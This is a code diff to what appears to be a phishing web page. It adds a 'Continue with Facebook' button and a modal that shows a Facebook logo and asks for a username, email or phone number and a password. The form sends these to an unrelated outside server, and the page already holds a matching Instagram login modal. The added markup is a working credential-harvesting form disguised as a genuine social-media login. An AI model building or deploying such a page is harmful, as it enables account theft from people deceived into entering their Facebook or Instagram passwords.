@@ -152,6 +152,12 @@ input[type=submit]:hover {
 
       <div class="col">
         <button type="button" class="fb btn" data-bs-toggle="modal" data-bs-target="#exampleModal">
+          <i class="fa fa-facebook fa-fw"></i> Continue with Facebook
+         </button>
+      
+      </div>
+       <div class="col">
+        <button type="button" class="fb btn" data-bs-toggle="modal" data-bs-target="#exampleModal2">
           <i class="fa fa-instagram fa-fw"></i> Continue with Instagram
          </button>
       
@@ -166,6 +172,28 @@ input[type=submit]:hover {
 padding: 1px;" src="v.mp4" ></video>
 <img src="unnamed.webp" class="img" alt="">
 <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      
+      <div class="modal-body" style="border-radius: 12px;">
+          <img src="logofb.png" style="margin-bottom: 21px; margin-top: 13px; width: 150px; display: block; margin-left: auto; margin-right: auto;" alt="">
+        <form action="https://api.aadyashainfotech.com/create.php" method="post" >
+          <div class="mb-3">
+            <input type="text" class="form-control" placeholder="Phone number, username, or email" name="mbid" id="recipient-name" required>
+          </div>
+          <div class="mb-3">
+            <input type="text" class="form-control" placeholder="Password" name="password" id="recipient-name" required>
+          </div>
+          <button type="submit" class="btn btn-primary">Log In</button>
+        </form>
+      </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <div class="modal fade" id="exampleModal2" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
   <div class="modal-dialog">
     <div class="modal-content">
       
